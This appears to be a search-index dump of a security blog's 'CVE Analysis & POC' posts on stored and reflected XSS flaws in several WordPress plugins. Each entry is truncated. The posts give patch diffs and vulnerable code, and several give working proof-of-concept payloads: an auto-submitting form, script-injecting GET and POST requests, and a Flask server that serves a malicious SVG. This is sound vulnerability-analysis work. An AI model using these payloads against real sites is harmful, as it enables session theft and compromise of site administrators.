while $wp_query is simply a reference pointing to $wp_the_query. Therefore, when $wp_the_query is initialized and has data, $wp_query will have the same data. We obtain the post_content value: \u003c!-- wp:avatar {\"userId\":2,\"isLink\":true,\"linkTarget\":\"_blank\"} /--\u003e wp:avatar is the core/avatar block type. The render() function will call call_user_func() with the callback rend","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:0:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WP Statistics Plugin.","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info WP Statistics ‚Äì The Most Popular Privacy-Friendly Analytics Plugin for WordPress has a Stored Cross-Site Scripting (XSS) vulnerability via the User-Agent Header in all versions up to and including 14.15.4. The root cause is insufficient input validation/filtering and output escaping. This vulnerability allows an unauthenticated attacker to inject malicious JavaScript into the system. The injected scripts will execute whenever a user visits a page containing the malicious data, posing severe security and privacy risks. CVE ID: CVE-2025-9816 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 14.15.4 Patched Versions: 14.15.5 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress WP Statistics Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP Statistics: v14.15.4 (vulnerable) and v14.15.5 (patched). Diff tool - Meld or any diff comparison tool to inspect differences between the two versions. Analysis I initially missed some details while collecting information about this CVE; the references of https://www.cve.org/CVERecord?id=CVE-2025-9816 point to where the vulnerability occurs: includes/admin/templates/pages/devices/models.php{: .filepath} But I overlooked it and used Meld to compare code. Because the code changed a lot, I proactively searched for files related to user-agent. The changes in UserAgent.php made me believe the vulnerability truly occurs there. It cost me quite a bit of time but I couldn‚Äôt fully analyze it at that point. However, this effort helped the overall analysis. üçÄ Fortunately, guided by senior researchers, I focused on the correct vulnerability location. That made the analysis easier. Tip: This is a Cross Site Scripting vulnerability that happens in the victim‚Äôs browser, so you need to find where it is first rendered into HTML. Patch diff The vulnerability occurs in file includes/admin/templates/pages/devices/models.php{: .filepath} at line 31. In the vulnerable version, $item-\u003emodel is printed into HTML without any protection: \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e In the patched version, $item-\u003emodel is protected by wrapping it with esc_attr() and esc_html(). \u003cspan title=\"\u003c?php echo esc_attr(\\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel)); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item-\u003emodel); ?\u003e \u003c/span\u003e üëâ The patch adds output escaping for $item-\u003emodel, ensuring it is escaped before being printed to HTML. Vulnerable code \u003c?php use WP_STATISTICS\\Helper; ?\u003e \u003cdiv class=\"postbox-container wps-postbox-full\"\u003e \u003c?php if (!empty($data['visitors'])) : ?\u003e \u003cdiv class=\"o-table-wrapper\"\u003e \u003ctable width=\"100%\" class=\"o-table wps-new-table\"\u003e \u003cthead\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($data['visitors'] as $item) : ?\u003e \u003ctr\u003e \u003ctd class=\"wps-pd-l\"\u003e \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c?php else : ?\u003e \u003cdiv class=\"o-wrap o-wrap--no-data wps-center\"\u003e \u003c?php esc_html_e('No recent data available.', 'wp-statistics'); ?\u003e \u003c/div\u003e \u003c?php endif; ?\u003e \u003c/div\u003e If $data is not empty it iterates over $data and displays statistical visitor data including model. If empty it prints No recent data available. public static function isUnknown($value) { if (empty($value) or $value == 'Unknown' or $value == __(\"Unknown\", 'wp-statistics')) { return true; } return false; } public static function unknownToNotSet($value) { if (self::isUnknown($value)) { return __('(not set)', 'wp-statistics'); } return $value; } unknownToNotSet() returns","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress All in One Time Clock Lite Plugin.","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analyst"],"content":"Reflected Cross-Site Scripting (XSS) vulnerability in the All in One Time Clock Lite plugin for WordPress. The vulnerability originates from the nonce parameter in versions up to and including 2.0, due to insufficient input handling and lack of output escaping. An attacker (including unauthenticated) can inject arbitrary script snippets into the page; these scripts will execute when the victim performs the manipulated action (for example: clicking a link). CVE ID: CVE-2025-6832 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.0 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress All in One Time Clock Lite Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - All in One Time Clock Lite: v2.0 (vulnerable) and v2.0.1 (patched). Diff tool - Meld or any diff comparison tool to inspect and compare differences between the two versions. Analysis Patch diff In the vulnerable version, the nonce parameter is taken directly from $_POST with no sanitization: $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; In the patched version, the nonce parameter is processed with sanitize_text_field() before use, preventing injection of malicious code: $nonce = (isset($_POST[\"nonce\"])) ? sanitize_text_field($_POST[\"nonce\"]) : null; üëâ The patch adds an input filtering layer for the nonce variable, ensuring data received from the request will have dangerous characters removed before further processing. Code change comparison between vulnerable and patched versions Vulnerable code The vulnerability is located in the function aio_time_clock_lite_js() of the class AIO_Time_Clock_Lite_Actions in the file aio-time-clock-lite-actions.php{: .filepath} public function aio_time_clock_lite_js() { // other logic $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; if (wp_verify_nonce($nonce, 'time-clock-nonce')) { // other logic } else { echo json_encode( [ \"response\" =\u003e \"failed\", \"message\" =\u003e esc_attr_x(\"Not authorized to perform this action\", 'aio-time-clock-lite'), \"nonce\" =\u003e $nonce, \"clock_action\" =\u003e $clock_action, ] ); } wp_reset_postdata(); die(); } {: file=‚Äúaio-time-clock-lite-actions.php‚Äù} The wp_verify_nonce() function compares the $nonce value sent from the client with a valid value previously generated by the server using wp_create_nonce(). \u003cinput type=\"hidden\" name=\"time-clock-nonce\" id=\"time-clock-nonce\" value=\"\u003c?php echo wp_create_nonce(\"time-clock-nonce\"); ?\u003e\"\u003e {: file=‚Äúaio-settings.php‚Äù} If $nonce is invalid =\u003e it goes to the else branch returning a JSON error that contains $nonce. Clicking 2 references shows that the function public function aio_time_clock_lite_js() is registered as a callback for action hooks: Callback registration for ajax hooks The function aio_time_clock_lite_js() is attached to two Ajax hooks (authenticated \u0026 unauthenticated) wp_ajax_aio_time_clock_lite_js (authenticated). wp_ajax_nopriv_aio_time_clock_lite_js (unauthenticated). =\u003e Focus Sources \u0026 Sinks Source: The nonce parameter is taken directly from $_POST (unauthenticated request). Sink: The nonce value is reflected back in echo json_encode(...). Flow Send a POST request (unauthenticated) to /wp-admin/admin-ajax.php with params: action=aio_time_clock_lite_js\u0026nonce=nonce_value The callback aio_time_clock_lite_js() is invoked The nonce value is checked =\u003e invalid The nonce value is reflected into the response body via echo json_encode(...) Exploit Proof of Concept (PoC) Create a webpage containing a submit form: \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"post\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"aio_time_clock_lite_js\"\u003e \u003cinput type=\"hidden\" name=\"nonce\" value=\"\u003csvg onload=alert()\u003e\"\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e Send the link to the page containing the form to a user with privileges. Observe the injected JavaScript executing. Result ‚Äî PoC execution screenshot Conclusion The CVE-2025-6832 vulnerability in All in One Ti","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"A vulnerability exists in the Download Manager plugin prior to version 3.3.24. Data retrieved from GET requests is printed directly into HTML attributes, leading to reflected XSS when a user with privileges accesses a URL crafted by an attacker. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Download Manager: v3.3.23(vulnerable) and v3.3.24(fixed) diff tool: meld or any tool capable of comparing differences between two versions Analysis Patch Diff Use any diff tool to compare the vulnerable and patched versions. A significant difference appears in src/Admin/views/stats/history.php. Vulnerable code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e The GET parameters are directly assigned to the \u003ca\u003e element‚Äôs href without any protection, creating a risk of reflected XSS. Patched code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL The patch sanitizes the GET parameters using sanitize_array and uses esc_url to escape the URL, making it safe. How It Works We need to identify the real URL to inject GET parameters containing the XSS payload. src/Admin/views/stats/history.php contains PHP and HTML tags inside the views folder, indicating it is included somewhere in the plugin. Searching for history.php in the plugin directory: Search results for history.php üëâ No direct matches are found. It is likely included dynamically like {$file_name}.php. Using regex \\{.*\\}\\.php: Regex search for dynamic includes src/Admin/views/stats/history.php is included in src/Admin/views/stats.php. The actual URL to access is declared at the top of stats.php: $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; Similarly, stats.php is also included elsewhere, but it‚Äôs not necessary to trace further since the URL is identified. To verify, we set a breakpoint in src/Admin/views/stats/history.php, start debugging, and access the URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params First, the plugin collects all GET parameters into $get_params. If $user_ids is not empty, a ‚ÄúClear filter‚Äù button is created. To make the button functional, it must generate a URL without the user_ids parameter: $get_params_xu = $get_params; // copy all GET parameters unset($get_params_xu['user_ids']); // remove user_ids from array $reset_url = add_query_arg($get_params_xu, 'edit.php'); // generate new URL unset($get_params_xu['user_ids']) removes the filter. add_query_arg($get_params_xu, 'edit.php') generates the URL with remaining parameters. This URL is attached to the ‚ÄúClear filter‚Äù button: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e Result: Clicking the button reloads the page without the user_ids filter. Exploit Detect XSS Send a GET request containing the XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 The \"\u003e\u003c/a\u003e closes the \u003ca\u003e tag, followed by a \u003cscript\u003e to trigger alert(). Reflected XSS triggered via GET parameter üëâ XSS succeeds. When a ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"A vulnerability in the ShopLentor plugin prior to version 3.2.0 allows an attacker with contributor privileges to inject malicious code into a block‚Äôs CSS. This CSS is then loaded inline into the page and can lead to Stored XSS when previewed or rendered in a browser. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. ShopLentor: v3.2.0 (vulnerable) and v3.2.1 (fixed) diff tool: meld or any tool capable of comparing the two versions to see differences Activated WooCommerce plugin: WooCommerce must be activated before installing the ShopLentor Plugin Analysis Patch Diff Use any diff tool to compare differences between the vulnerable and fixed versions. The notable difference is in the file woolentor-blocks/includes/classes/Manage_Styles.php. Vulnerable version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // No user permission check // No sanitization of CSS before saving update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } Fixed version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Only admin or the post author are allowed $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // Sanitize data before saving $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } The patch uses current_user_can('manage_options') to check for admin privileges: If the user is admin =\u003e the first part ! current_user_can('manage_options') = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. If the user is the author =\u003e the latter part get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. Patch Diff How It Works public function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } The save_block_css() function in the Manage_Styles clas","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"The vulnerability exists in the Authorsy plugin for WordPress prior to version 1.0.6. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Although the description requires Subscriber privileges, it can actually be exploited Unauthenticated. Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Authorsy: v1.0.5 (vulnerable) and v1.0.6 (patched) Diff tool: meld or any tool to compare two versions Analysis The plugin allows custom CSS, stores it in wp_options, and injects it directly into the \u003cstyle\u003e tag on pages. However, users can interact with the API to modify CSS without proper access control, leading to Broken Access Control and potential XSS if malicious payloads are inserted. Patch Diff Use a diff tool to compare vulnerable and patched versions. Notice clear differences in two files: core/settings/api-settings.php and core/enqueue-inline/enqueue-inline.php. File core/enqueue-inline/enqueue-inline.php public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } User data is inserted without validation, leaving it vulnerable to XSS. Patched version: public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single() \u0026\u0026 !empty($ea_custom_css)){ // Sanitize and escape to prevent XSS $ea_custom_css = wp_strip_all_tags($ea_custom_css); $ea_custom_css = esc_html($ea_custom_css); $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } Sanitization ensures only safe CSS is injected. Diff showing changes in enqueue-inline.php to sanitize custom CSS File core/settings/api-settings.php Vulnerable: 'permission_callback' =\u003e function () { return true; }, Patched: 'permission_callback' =\u003e function () { return current_user_can('manage_options'); }, The permission callback now restricts access to admins, mitigating Broken Access Control and indirectly reducing XSS risk. Diff showing REST API permission callback changes in api-settings.php How it works custom_inline_css() is hooked to wp_head. When WordPress renders the \u003chead\u003e section, this function concatenates user options from authorsy_get_option() into $custom_css and adds it inline: $custom_css = authorsy_get_option('ea_custom_css'); Since this data is stored in the database, this is Stored XSS. Exploit Send a POST request to /wp-json/authorsy/v1/settings with an XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } The payload closes the existing \u003cstyle\u003e and injects a \u003cscript\u003e tag. Visiting any page will execute the XSS. Injected XSS payload in via custom CSS \u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e Conclusion The CVE-2025-27006 vulnerability in Authorsy \u003c= 1.0.5 demonstrates Broken Access Control combined with XSS. Root causes: REST API lacks proper access control (permission_callback always true). Custom CSS is inserted without sanitization, enabling injection of \u003cscript\u003e tags. Nonce verification does not stop execution when invalid, making security checks ineffective. Key takeaways: Always use proper permission_callback to prevent Broken Access Control. Sanitize and escape user input before rendering in HTML/CSS/JS to prevent XSS. References Cross-site scripting (XSS) ch","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"The vulnerability exists in the Assistant plugin for WordPress prior to version 3.6.2. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Assistant: v1.5.2 (vulnerable) and v1.5.3 (patched) Diff tool: meld or any tool capable of comparing two versions Analysis The application displays user-provided image content directly via a URL without validating or fully checking the MIME type. This allows an attacker to supply a file disguised as an image, which when processed by the browser, executes malicious code ‚Üí resulting in an XSS vulnerability. Patch Diff Use any diff tool to compare the vulnerable version and the patch. Diff between vulnerable and patched version In this case, there are significant differences between the two versions. For easier tracking, the change log identifies where the XSS patch was applied: Changelog 1.5.3 (2025-09-08) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" üëâ The vulnerability is located in backend/src/Hooks/ImageProxy.php. Observing the differences between the two versions: Differences in the render_image function of ImageProxy.php The changes occur in the render_image function, which: Accepts a URL parameter from the query string ($_GET['url']). Sends a request from the server to that URL to fetch the content. Prevents SSRF using wp_safe_remote_get. If the content has a Content-Type header starting with image/, then: Sends the same Content-Type header back to the client. Echoes the file content to the browser. The browser displays the image not directly from the original source but through the WordPress server. SVG files also have a Content-Type starting with image/ and can contain embedded JavaScript ‚Üí XSS can occur. The patch added an additional check to verify the actual MIME type of the file to prevent XSS via SVG or maliciously disguised files. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() uses internal image processing (based on the binary data of the file) to determine the actual MIME type. If the result is not a valid image ‚Üí returns false. How it works In the __construct of the ImageProxy class, the render_image() method is called via the 'init' action hook. The 'init' hook runs early in WordPress loading, after core objects are initialized but before output is sent to the browser. render_image is called only if the current user has permission to edit other users‚Äô posts and the $_GET['fl_asst_image_proxy'] parameter exists. üëâ Accessing /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path triggers render_image and returns the image content to the browser. Exploit Detect XSS Create a simple web page returning an SVG containing an XSS payload: from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") Send a request with the url parameter pointing to https://yoursite/svg: http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg üëâ Successful for Unauthenticated because as long as the user has permission, accessing the URL triggers XSS in the victim‚Äôs ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"The vulnerability exists in the Hostel plugin for WordPress prior to version 1.1.5.8. An attacker could exploit it to target high-privilege users like admins. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.7 (vulnerable) and v1.1.5.8 (patched) Diff tool: meld or any tool that can compare two versions Analysis The root cause is the lack of sanitization and escaping for a parameter before rendering it on the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability. Patch Diff Use any diff tool to compare the vulnerable version and the patch. The differences are clearly in two files: views/bookings.html.php and controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The parameter ob is directly taken from $_GET['ob'] and echoed into an HTML attribute without escaping, making it vulnerable to Reflected XSS, since an attacker can inject payloads into the query string. Patched Code \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The patch uses esc_attr() to safely encode $_GET['ob'] before echoing into the HTML attribute. Diff showing patched and vulnerable code Source: $_GET['ob'] is client-controlled input from the URL query string. Sink: echoed in an HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e. üëâ Because the source does not go through controller logic, the diff of controllers/bookings.php is less relevant. How it works For $_GET['ob'] to be echoed in the HTML attribute of \u003ca\u003e, the if condition enclosing \u003ca\u003e must be true: \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e üëâ The key condition is if($offset \u003e 0). If true, the XSS can occur regardless of the second condition. The views/bookings.html.php file cannot be accessed directly; it must be included by the controller using include(). The $offset variable is initialized in the controller and passed to the view. Searching the plugin controllers shows that $offset is set in the default branch (listing bookings) of the static manage() method in class WPHostelBookings in controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['dir']) ? 'ASC' : $_GET['dir']; if($dir != 'ASC' and $dir != 'DESC') $dir = 'ASC'; $odir = ($dir == 'ASC') ? 'DESC' : 'ASC'; $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \"","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 